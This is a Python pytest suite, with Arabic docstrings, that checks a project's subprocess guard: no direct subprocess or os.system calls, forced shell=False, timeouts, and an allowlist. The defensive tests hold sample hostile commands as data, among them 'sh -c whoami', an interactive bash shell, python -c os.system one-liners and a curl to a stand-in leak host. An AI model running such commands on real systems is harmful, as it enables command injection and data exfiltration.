import ast
from pathlib import Path
import pytest
from unittest.mock import patch
from scripts.security.security import safe_subprocess, safe_popen

class TestSubprocessSecurity:
    """أمان الـ Subprocess"""
    
    def test_no_direct_subprocess_calls(self):
        """لا يسمح باستخدام subprocess مباشرة"""
        base_dir = Path(__file__).parent.parent.parent
        
        python_files = []
        if (base_dir / "api").exists():
            python_files.extend((base_dir / "api").rglob("*.py"))
        if (base_dir / "scripts").exists():
            python_files.extend((base_dir / "scripts").rglob("*.py"))
        
        # Exceptions - scripts allowed to use subprocess (they are wrapped/secured or developer/CI utilities)
        allowed_files = [
            str(base_dir / "scripts" / "security" / "security.py"), 
            str(base_dir / "scripts" / "security" / "path_security.py"),
            str(base_dir / "scripts" / "metrics" / "benchmark_guards.py"),
            str(base_dir / "scripts" / "validators" / "check_ground_truth_sync.py"),
        ]
        
        # Test file itself is allowed to have the word subprocess
        allowed_files.append(str(Path(__file__).resolve()))
        
        for file_path in python_files:
            if str(file_path) in allowed_files:
                continue
            
            try:
                tree = ast.parse(file_path.read_text(encoding="utf-8"))
            except SyntaxError:
                continue
                
            for node in ast.walk(tree):
                if isinstance(node, ast.Attribute):
                    if isinstance(node.value, ast.Name):
                        if node.value.id == "subprocess":
                            if node.attr in {"run", "call", "Popen", "check_output"}:
                                pytest.fail(f"{file_path} uses direct subprocess.{node.attr}")
                                
    def test_no_os_system_calls(self):
        """لا يسمح باستخدام os.system"""
        base_dir = Path(__file__).parent.parent.parent
        python_files = list(base_dir.rglob("*.py"))
        
        for file in python_files:
            if "node_modules" in file.parts or ".venv" in file.parts or ".pytest_cache" in file.parts:
                continue
                
            try:
                tree = ast.parse(file.read_text(encoding="utf-8"))
            except SyntaxError:
                continue
                
            for node in ast.walk(tree):
                if isinstance(node, ast.Attribute):
                    if isinstance(node.value, ast.Name):
                        if node.value.id == "os" and node.attr == "system":
                            pytest.fail(f"{file} uses os.system")
                            
    @patch('scripts.security.security.subprocess.run')
    def test_safe_subprocess_forces_shell_false(self, mock_run):
        """يجب أن يجبر safe_subprocess shell=False حتى لو تم طلب True"""
        # Call with shell=True explicitly
        safe_subprocess(["ffmpeg", "-version"], shell=True)
        
        # Verify it was forced to False
        mock_run.assert_called_once()
        _, kwargs = mock_run.call_args
        assert kwargs.get('shell') is False, "Security guard MUST force shell=False"
        
    @patch('scripts.security.security.subprocess.run')
    def test_safe_subprocess_enforces_timeout(self, mock_run):
        """يجب أن يحقن timeout افتراضي إذا لم يتم توفيره"""
        # Call without timeout
        safe_subprocess(["ffmpeg", "-version"])
        
        # Verify timeout was injected
        mock_run.assert_called_once()
        _, kwargs = mock_run.call_args
        assert kwargs.get('timeout') is not None, "Security guard MUST enforce timeout"
        assert kwargs['timeout'] > 0

    @patch('scripts.security.security.subprocess.Popen')
    def test_safe_popen_forces_shell_false(self, mock_popen):
        """يجب أن يجبر safe_popen shell=False حتى لو تم طلب True"""
        safe_popen(["ffmpeg", "-version"], shell=True)
        mock_popen.assert_called_once()
        _, kwargs = mock_popen.call_args
        assert kwargs.get('shell') is False, "Security guard MUST force shell=False for Popen"

    def test_safe_subprocess_rejects_unallowed_command(self):
        """يجب أن يرفض safe_subprocess الأوامر غير المصرح بها فوراً (منع حقن الأوامر)"""
        with pytest.raises(PermissionError, match="Command not allowed"):
            safe_subprocess(["sh", "-c", "whoami"])

    def test_safe_popen_rejects_unallowed_command(self):
        """يجب أن يرفض safe_popen الأوامر غير المصرح بها فوراً (منع حقن الأوامر)"""
        with pytest.raises(PermissionError, match="Command not allowed"):
            safe_popen(["bash", "-i"])

    def test_subprocess_nosemgrep_rationale_documented(self):
        """التحقق من توثيق تعليق nosemgrep المبرر على مواضع subprocess"""
        sec_file = Path(__file__).parent.parent.parent / "scripts" / "security" / "security.py"
        content = sec_file.read_text(encoding="utf-8")
        assert "nosemgrep" in content, "nosemgrep annotation missing from scripts/security/security.py"
        assert "CommandPolicy validates and allowlists executable" in content, "Rationale comment missing"

    def test_tainted_input_strictly_prevented_by_command_policy(self):
        """
        Fix 3: أثبات أن CommandPolicy.validate_command يمنع الإدخال الملوّث تماماً.
        محاولة تنفيذ أوامر خطرة مثل -c أو أوامر غير مدرجة بالقائمة البيضاء تُرفض فوراً.
        """
        dangerous_cmds = [
            ["python", "-c", "import os; os.system('echo pwned')"],
            ["python3", "-c", "open('/tmp/pwned', 'w').write('bad')"],
            ["node", "-e", "process.exit(1)"],
            ["sh", "-c", "whoami"],
            ["curl", "https://malicious.domain.com/leak"],
        ]
        for cmd in dangerous_cmds:
            with pytest.raises(PermissionError, match="Command not allowed"):
                safe_subprocess(cmd)

    def test_unvalidated_version_executes_tainted_input_proving_gate_necessity(self, monkeypatch):
        """
        Fix 3: يثبت أنه بدون التحقق (عبر تعطيل validate_command)، يتسرب الأمر الملوّث لـ subprocess.
        هذا يثبت أن الحماية قائمة تماماً على بوابة validate_command.
        """
        from scripts.core.security.command_policy import CommandPolicy, CommandValidationResult
        malicious_cmd = ["python", "-c", "import os; os.system('whoami')"]

        # مع غياب التحقق (محاكاة كود غير آمن يتجاوز التحقق)
        with patch('scripts.security.security.subprocess.run') as mock_run:
            mock_run.return_value = None
            monkeypatch.setattr(
                CommandPolicy,
                "validate_command",
                lambda *args, **kwargs: CommandValidationResult(
                    is_allowed=True,
                    sanitized_cmd=list(malicious_cmd),
                    executable=malicious_cmd[0],
                    subcommand="-c",
                    sanitized_env={},
                    timeout_seconds=30,
                    max_output_bytes=1000,
                    cwd=Path("."),
                    violations=[]
                )
            )
            # في غياب التحقق، ينفذ الأمر:
            safe_subprocess(malicious_cmd)
            mock_run.assert_called_once()
            called_cmd, _ = mock_run.call_args
            assert called_cmd[0] == malicious_cmd
